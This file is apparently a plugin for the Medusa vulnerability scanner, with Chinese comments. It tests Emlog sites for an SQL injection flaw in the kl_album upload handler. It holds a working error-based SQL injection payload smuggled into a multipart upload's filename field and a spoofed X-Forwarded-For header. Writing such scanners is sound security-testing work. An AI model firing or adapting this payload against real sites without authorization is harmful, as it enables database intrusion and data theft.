#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from ClassCongregation import UrlProcessing,VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling,Proxies

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['create_date'] = "2020-05-17"  # 插件编辑时间
        self.info['disclosure']='2014-11-12'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "EmlogSQLInjectionVulnerability"  # 插件名称
        self.info['name'] ='EmlogSQL注入漏洞' #漏洞名称
        self.info['affects'] = "Emlog"  # 漏洞组件
        self.info['desc_content'] = "Emlog相册插件SQL注入漏洞"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies = Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload = 'content/plugins/kl_album/kl_album_ajax_do.php'
        payload_url = scheme + "://" + url +":"+ str(port) + payload
        data = '''
-----------------------------19397961610256
Content-Disposition: form-data; name="Filedata"; filename="info',(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,md5(1)))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a),'','','0','0','', 0)#.jpg"
Content-Type: image/jpeg

1
-----------------------------19397961610256
Content-Disposition: form-data; name="album"

111111
-----------------------------19397961610256--'''
        headers = {
            'User-Agent': RandomAgent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'X-Forwarded-For': '8.8.8.8',
            'Connection': 'Keep-Alive',
            'Content-Type': 'multipart/form-data; boundary=---------------------------19397961610256',
            'Content-Length':'514'

        }
        resp = requests.post(payload_url, data=data, headers=headers, timeout=6, proxies=proxies, verify=False)
        con = resp.text
        code = resp.status_code
        if code==200 and con.find("c4ca4238a0b923820dcc509a6f75849b")!= -1:
            Medusa = "{}存在EmlogSQL注入漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类